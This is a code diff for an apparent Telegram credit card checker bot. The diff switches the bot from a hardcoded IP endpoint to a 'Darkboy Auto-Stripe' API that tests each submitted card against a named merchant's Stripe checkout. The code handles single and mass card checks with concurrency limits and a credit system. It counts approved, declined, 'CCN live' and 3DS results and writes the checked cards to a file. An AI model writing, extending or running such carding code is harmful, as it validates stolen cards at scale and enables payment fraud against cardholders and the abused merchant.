@@ -1153,8 +1153,21 @@ async def get_bin_details(bin_number: str) -> dict:
 # ✅ Background check now uses live BIN data
 async def background_check(cc_normalized, parts, user, user_data, processing_msg):
     bullet_link = f"\[[₰]({BULLET_GROUP_LINK})\]"
-    
+
+    # Stylish response mapping
+    def style_response(api_response: str):
+        text = api_response.lower()
+        if text in ["succeeded", "approved"]:
+            return "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅"
+        elif text == "declined":
+            return "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"
+        elif text == "failed":
+            return "𝗙𝗔𝗜𝗟𝗘𝗗 ❌"
+        else:
+            return f"**{api_response.upper()}**"  # Unknown responses in bold
+
     try:
+        # BIN details
         bin_number = parts[0][:6]
         bin_details = await get_bin_details(bin_number)
 
@@ -1163,34 +1176,33 @@ async def background_check(cc_normalized, parts, user, user_data, processing_msg
         country_name = (bin_details.get("country_name") or "N/A")
         country_flag = bin_details.get("country_emoji", "")
 
-        # Your main API call
-        api_url = f"http://31.97.66.195:8000/?key=k4linuxx&card={cc_normalized}"
-        
+        # New Darkboy Auto-Stripe API URL
+        api_url = (
+            f"https://darkboy-auto-stripe.onrender.com"
+            f"/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={cc_normalized}"
+        )
+
         async with aiohttp.ClientSession() as session:
             async with session.get(api_url, timeout=45) as resp:
                 if resp.status != 200:
                     raise Exception(f"HTTP {resp.status}")
                 data = await resp.json()
 
-        api_status = (data.get("status") or "Unknown").strip()
+        # Parse API response
+        api_status = (data.get("status") or "").strip()
+        api_response = (data.get("response") or "").strip()
 
-        # Status formatting
-        status_text = api_status.upper()
-        if "approved" in api_status.lower():
-            status_text = "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅"
-        elif "declined" in api_status.lower():
-            status_text = "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"
-        elif "ccn live" in api_status.lower():
-            status_text = "𝗖𝗖𝗡 𝗟𝗜𝗩𝗘 ❎"
-        
-        header = f"═══\\[ **{escape_markdown_v2(status_text)}** \\]═══"
+        # Apply stylish formatting
+        status_text = style_response(api_status)
+        formatted_response = style_response(api_response)
 
-        formatted_response = f"_{escape_markdown_v2(api_status)}_"
+        # Prepare message
+        header = f"═══\\[ {escape_markdown_v2(status_text)} \\]═══"
 
         final_text = (
             f"{header}\n"
             f"{bullet_link} Card ➜ `{escape_markdown_v2(cc_normalized)}`\n"
-            f"{bullet_link} Gateway ➜ 𝓢𝘁𝗿𝗶𝗽𝗲 𝘈𝘶𝘵𝗵\n"
+            f"{bullet_link} Gateway ➜ 𝓢𝘁𝗿𝗶𝗽𝗲 𝘈𝘂𝘁𝗼𝗴𝗮𝘁𝗲\n"
             f"{bullet_link} Response ➜ {formatted_response}\n"
             f"――――――――――――――――\n"
             f"{bullet_link} Brand ➜ {escape_markdown_v2(brand)}\n"
@@ -1214,6 +1226,7 @@ async def background_check(cc_normalized, parts, user, user_data, processing_msg
             parse_mode=ParseMode.MARKDOWN_V2,
             disable_web_page_preview=True
         )
+
 
 
 
@@ -1443,10 +1456,22 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
 
     semaphore = asyncio.Semaphore(5)  # limit to 5 concurrent requests
 
+    # Stylish mapping function
+    def style_response(api_response: str):
+        text = api_response.lower()
+        if text in ["succeeded", "approved"]:
+            return "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅"
+        elif text == "declined":
+            return "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"
+        elif text == "failed":
+            return "𝗙𝗔𝗜𝗟𝗘𝗗 ❌"
+        else:
+            return f"**{api_response.upper()}**"  # Unknown responses in bold
+
     async def check_card(session, raw):
         nonlocal approved_count, declined_count, checked_count, error_count
 
-        async with semaphore:  # acquire semaphore before running
+        async with semaphore:
             parts = raw.split("|")
             if len(parts) != 4:
                 checked_count += 1
@@ -1458,7 +1483,11 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
                 parts[2] = parts[2][-2:]
             cc_normalized = "|".join(parts)
 
-            api_url = f"http://31.97.66.195:8000/?key=k4linuxx&card={cc_normalized}"
+            # New Darkboy Auto-Stripe API URL
+            api_url = (
+                f"https://darkboy-auto-stripe.onrender.com"
+                f"/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={cc_normalized}"
+            )
 
             try:
                 async with session.get(api_url, timeout=45) as resp:
@@ -1475,22 +1504,25 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
                 error_count += 1
                 return f"❌ API Error for card `{cc_normalized}`: {escape_markdown(str(e) or 'Unknown', version=2)}"
 
-            api_response = data.get("status", "Unknown")
-            api_response_clean = normalize_text(
-                re.sub(r'[\U00010000-\U0010ffff]', '', api_response).strip()
-            )
+            api_status = (data.get("status") or "").strip()
+            api_response_text = (data.get("response") or "").strip()
 
-            api_response_lower = api_response_clean.lower()
-            if "approved" in api_response_lower:
+            # Apply stylish formatting
+            styled_status = style_response(api_status)
+            styled_response = style_response(api_response_text)
+
+            # Count approved/declined
+            api_lower = api_status.lower()
+            if api_lower in ["approved", "succeeded"]:
                 approved_count += 1
-            elif "declined" in api_response_lower or "incorrect" in api_response_lower:
+            elif api_lower in ["declined", "failed"]:
                 declined_count += 1
 
             checked_count += 1
 
             return (
                 f"`{cc_normalized}`\n"
-                f"𝐒𝐭𝐚𝐭𝐮𝐬 ➳ {escape_markdown(api_response_clean, version=2)}"
+                f"𝐒𝐭𝐚𝐭𝐮𝐬 ➳ {styled_response}"
             )
 
     async with aiohttp.ClientSession() as session:
@@ -1502,6 +1534,7 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
             result = await coro
             results.append(result)
 
+            # Periodic update
             if time.time() - last_update >= update_interval:
                 last_update = time.time()
                 current_summary = (
@@ -1541,6 +1574,7 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
         "\n──────── ⸙ ─────────",
         parse_mode=ParseMode.MARKDOWN_V2
     )
+
 
 
 
@@ -1785,8 +1819,8 @@ def normalize_status_string(status):
 # --- CARD CHECKER LOGIC ---
 async def check_cards_background(cards_to_check, user_id, user_first_name, processing_msg, start_time):
     """
-    Asynchronously checks a list of credit cards and updates a Telegram message with the progress.
-    This function is designed to run as a background task.
+    Asynchronously checks a list of credit cards using Darkboy Auto-Stripe API
+    and updates a Telegram message with the progress.
     """
     approved_count = declined_count = checked_count = error_count = 0
     results = []
@@ -1798,74 +1832,96 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
         await processing_msg.edit_text("❌ You don’t have enough credits.")
         return
 
-    semaphore = asyncio.Semaphore(2)  # Limit concurrent requests to 10
+    semaphore = asyncio.Semaphore(5)  # Limit concurrent requests
+
+    # Stylish response mapping
+    def style_response(api_response: str):
+        text = api_response.lower()
+        if text in ["succeeded", "approved"]:
+            return "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅"
+        elif text == "declined":
+            return "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"
+        elif text == "failed":
+            return "𝗙𝗔𝗜𝗟𝗘𝗗 ❌"
+        else:
+            return f"**{api_response.upper()}**"  # Unknown responses in bold
 
     async with aiohttp.ClientSession() as session:
         async def fetch_card(card):
-            """Fetches the status of a single card from the API."""
-            nonlocal error_count
+            """Fetches the status of a single card from the Darkboy API."""
+            nonlocal approved_count, declined_count, error_count
             async with semaphore:
-                # The API URL is a placeholder.
-                api_url = f"http://31.97.66.195:8000/?key=k4linuxx&card={card}"
+                parts = card.split("|")
+                if len(parts) != 4:
+                    error_count += 1
+                    return card, "❌ Invalid card format"
+                # Normalize year (YYYY → YY)
+                if len(parts[2]) == 4:
+                    parts[2] = parts[2][-2:]
+                cc_normalized = "|".join(parts)
+
+                api_url = (
+                    f"https://darkboy-auto-stripe.onrender.com"
+                    f"/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={cc_normalized}"
+                )
                 try:
                     async with session.get(api_url, timeout=45) as resp:
+                        if resp.status != 200:
+                            raise Exception(f"HTTP {resp.status}")
                         data = await resp.json()
-                        status = data.get("status", "Unknown ❓")
+                        api_status = data.get("status", "").strip()
+                        api_response_text = data.get("response", "").strip()
+                        styled_status = style_response(api_status)
+                        styled_response = style_response(api_response_text)
+
+                        # Count statuses
+                        if api_status.lower() in ["approved", "succeeded"]:
+                            approved_count += 1
+                        elif api_status.lower() in ["declined", "failed"]:
+                            declined_count += 1
+
+                        return cc_normalized, styled_response
                 except Exception as e:
-                    # Catch network and JSON parsing errors
-                    status = f"❌ API Error: {str(e)}"
                     error_count += 1
-                return card, status
+                    return cc_normalized, f"❌ API Error: {str(e)}"
 
         tasks = [fetch_card(card) for card in cards_to_check]
+        update_interval = 3
+        last_update = time.time()
 
         for coro in asyncio.as_completed(tasks):
             raw, status = await coro
-            
-            # Normalize the status string using the new helper function
-            normalized_status = normalize_status_string(status)
-
-            # Count statuses by checking for the specific, stylized substrings
-            if "approved" in normalized_status.lower():
-                approved_count += 1
-            elif "card declined" in normalized_status.lower():
-                declined_count += 1
             checked_count += 1
 
             # Escape dynamic content for MarkdownV2
             raw_safe = escape_markdown(raw, version=2)
             status_safe = escape_markdown(status, version=2)
-            # Append the formatted card string to the results list
             results.append(f"`{raw_safe}`\n𝐒𝐭𝐚𝐭𝐮𝐬 ➳ {status_safe}")
 
-            # Update progress after each card is checked
-            current_time_taken = round(time.time() - start_time, 2)
-            
-            summary = (
-                f"✘ 𝐓𝐨𝐭𝐚𝐥↣{total_cards}\n"
-                f"✘ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝↣{checked_count}\n"
-                f"✘ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝↣{approved_count}\n"
-                f"✘ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣{declined_count}\n"
-                f"✘ 𝐄𝐫𝐫𝐨𝐫↣{error_count}\n"
-                f"✘ 𝐓𝐢𝐦𝐞↣{current_time_taken}s\n"
-                f"\n𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸\n"
-                f"──────── ⸙ ─────────"
-            )
-            
-            try:
-                # Join all results with the separator for the intermediate update
-                await processing_msg.edit_text(
-                    escape_markdown(summary, version=2) + "\n\n" + "\n──────── ⸙ ─────────\n".join(results) + "\n──────── ⸙ ─────────",
-                    parse_mode=ParseMode.MARKDOWN_V2
+            # Periodic progress update
+            if time.time() - last_update >= update_interval:
+                last_update = time.time()
+                current_time_taken = round(time.time() - start_time, 2)
+                summary = (
+                    f"✘ 𝐓𝐨𝐭𝐚𝐥↣{total_cards}\n"
+                    f"✘ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝↣{checked_count}\n"
+                    f"✘ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝↣{approved_count}\n"
+                    f"✘ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣{declined_count}\n"
+                    f"✘ 𝐄𝐫𝐫𝐨𝐫↣{error_count}\n"
+                    f"✘ 𝐓𝐢𝐦𝐞↣{current_time_taken}s\n"
+                    f"\n𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸\n"
+                    f"──────── ⸙ ─────────"
                 )
-            except Exception:
-                # Ignore Telegram errors for partial updates (e.g., if message is unchanged)
-                pass
+                try:
+                    await processing_msg.edit_text(
+                        escape_markdown(summary, version=2) + "\n\n" +
+                        "\n──────── ⸙ ─────────\n".join(results) + "\n──────── ⸙ ─────────",
+                        parse_mode=ParseMode.MARKDOWN_V2
+                    )
+                except Exception:
+                    pass
 
-            # Wait for 3 seconds before checking the next card
-            await asyncio.sleep(3)
-
-    # Final message is already in the correct format, no change needed
+    # Final summary
     final_time_taken = round(time.time() - start_time, 2)
     final_summary = (
         f"✘ 𝐓𝐨𝐭𝐚𝐥↣{total_cards}\n"
@@ -1878,9 +1934,11 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
         f"──────── ⸙ ─────────"
     )
     await processing_msg.edit_text(
-        escape_markdown(final_summary, version=2) + "\n\n" + "\n──────── ⸙ ─────────\n".join(results) + "\n──────── ⸙ ─────────",
+        escape_markdown(final_summary, version=2) + "\n\n" +
+        "\n──────── ⸙ ─────────\n".join(results) + "\n──────── ⸙ ─────────",
         parse_mode=ParseMode.MARKDOWN_V2
     )
+
 
 
 # --- /mass command handler ---
@@ -2212,11 +2270,19 @@ async def mtchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 # ─── Background Task ──────────────────────────────
+import aiohttp
+import asyncio
+import json
+import os
+import re
+from telegram import InputFile
+from telegram.constants import ParseMode
+
 async def background_check_multi(update, context, cards, processing_msg):
     """
-    Performs the background card check and handles all status updates and file output.
-    This version processes cards in parallel with robust error handling.
+    Performs background card checks with stylish responses and file output.
     """
+
     results = []
     approved = 0
     declined = 0
@@ -2226,44 +2292,52 @@ async def background_check_multi(update, context, cards, processing_msg):
     total = len(cards)
 
     async def escape_md(text):
+        # Escape Telegram MarkdownV2 special characters
         special_chars = r'\_*[]()~`>#+-=|{}.!'
         return re.sub(f"([{re.escape(special_chars)}])", r"\\\1", text)
 
-    async def check_card_with_semaphore(session, card, semaphore):
+    def normalize_status_text(text):
+        """
+        Normalize API responses to standardized stylish statuses.
+        """
+        text_lower = text.lower()
+        if "approved" in text_lower or "succeeded" in text_lower:
+            return "✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗"
+        elif "declined" in text_lower:
+            return "❌ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗"
+        elif "ccn live" in text_lower:
+            return "💳 𝗖𝗖𝗡 𝗟𝗜𝗩𝗘"
+        elif "3d" in text_lower or "threed" in text_lower:
+            return "⚠️ 𝟯𝗗𝗦"
+        else:
+            return "❓ 𝗨𝗡𝗞𝗡𝗢𝗪𝗡"
+
+    async def check_card(session, card, semaphore):
         async with semaphore:
-            return await check_card(session, card)
-
-    async def check_card(session, card):
-        try:
-            async with session.get(
-                f"http://31.97.66.195:8000/?key=k4linuxx&card={card}",
-                timeout=45
-            ) as resp:
-                text_data = await resp.text()
-
-                # Attempt to parse JSON
-                try:
-                    json_data = json.loads(text_data)
-                    status_text = json_data.get("status", "Unknown")
-                except (json.JSONDecodeError, KeyError):
-                    status_text = text_data.strip()
-                
-                return card, status_text
-
-        except Exception as e:
-            return card, f"Error: {str(e)}"
+            try:
+                async with session.get(
+                    f"http://31.97.66.195:8000/?key=k4linuxx&card={card}",
+                    timeout=45
+                ) as resp:
+                    text_data = await resp.text()
+                    try:
+                        json_data = json.loads(text_data)
+                        status_text = json_data.get("status", text_data)
+                    except (json.JSONDecodeError, KeyError):
+                        status_text = text_data.strip()
+                    stylish_status = normalize_status_text(status_text)
+                    return card, stylish_status
+            except Exception as e:
+                return card, f"❌ 𝗘𝗥𝗥𝗢𝗥: {str(e)}"
 
     async def update_progress(current_count):
         filled_len = round((current_count / total) * 10)
         empty_len = 10 - filled_len
         bar = "■" * filled_len + "□" * empty_len
-        
         progress_text = (
             f"━━ ⚡𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵⚡ ━━\n"
-            f"💳𝑻𝒐𝒕𝒂𝒍 𝑪𝒂𝒓𝒅𝒔 ➼ {total} | ✅𝐂𝐡𝐞𝐜𝐤𝐞𝐝 ➼ {current_count}/{total}\n"
-            f"✦━━━━━━━━━━✦\n"
-            f"▌ [{bar}] ▌\n"
-            f"✦━━━━━━━━━━━━━━━━━━━✦"
+            f"💳 𝑻𝒐𝒕𝒂𝒍 𝑪𝒂𝒓𝒅𝒔 ➼ {total} | ✅𝐂𝐡𝐞𝐜𝐤𝐞𝐝 ➼ {current_count}/{total}\n"
+            f"▌ [{bar}] ▌"
         )
         try:
             await processing_msg.edit_text(await escape_md(progress_text), parse_mode=ParseMode.MARKDOWN_V2)
@@ -2272,40 +2346,41 @@ async def background_check_multi(update, context, cards, processing_msg):
 
     async with aiohttp.ClientSession() as session:
         semaphore = asyncio.Semaphore(7)
-        tasks = [check_card_with_semaphore(session, card, semaphore) for card in cards]
+        tasks = [check_card(session, card, semaphore) for card in cards]
 
         for i, task in enumerate(asyncio.as_completed(tasks)):
-            card, status_text = await task
-            
-            normalized_status = normalize_status_text(status_text)
+            card, stylish_status = await task
+            results.append(f"`{card}` ➳ {stylish_status}")
 
-            # Check for the specific statuses in order of priority
-            if "✅" in status_text:
+            # Count each status
+            if "✅" in stylish_status:
                 approved += 1
-            elif "❌" in status_text:
+            elif "❌" in stylish_status:
                 declined += 1
-            elif "CCN LIVE" in normalized_status:  # Prioritize CCN Live check
+            elif "💳" in stylish_status:
                 ccn_live += 1
-            elif "❎" in status_text:  # Check for 3DS only if not CCN Live
+            elif "⚠️" in stylish_status:
                 threed += 1
             else:
                 unknown += 1
-            
-            results.append(f"{card} -> {status_text}")
-            
-            await update_progress(len(results))
 
+            await update_progress(len(results))
+            await asyncio.sleep(1)  # Slight delay to avoid flooding edits
+
+    # Save results to file
     output_filename = "checked.txt"
     with open(output_filename, "w", encoding="utf-8") as f:
         f.write("\n".join(results))
 
+    # Delete the processing message
     try:
         await processing_msg.delete()
     except Exception:
         pass
 
+    # Prepare summary
     summary = (
-        "✦━━━━ 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 ━━━━✦\n" 
+        "✦━━━━ 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 ━━━━✦\n"
         f"📊 𝗧𝗼𝘁𝗮𝗹     » {total}\n"
         f"✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱  » {approved}\n"
         f"❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱  » {declined}\n"
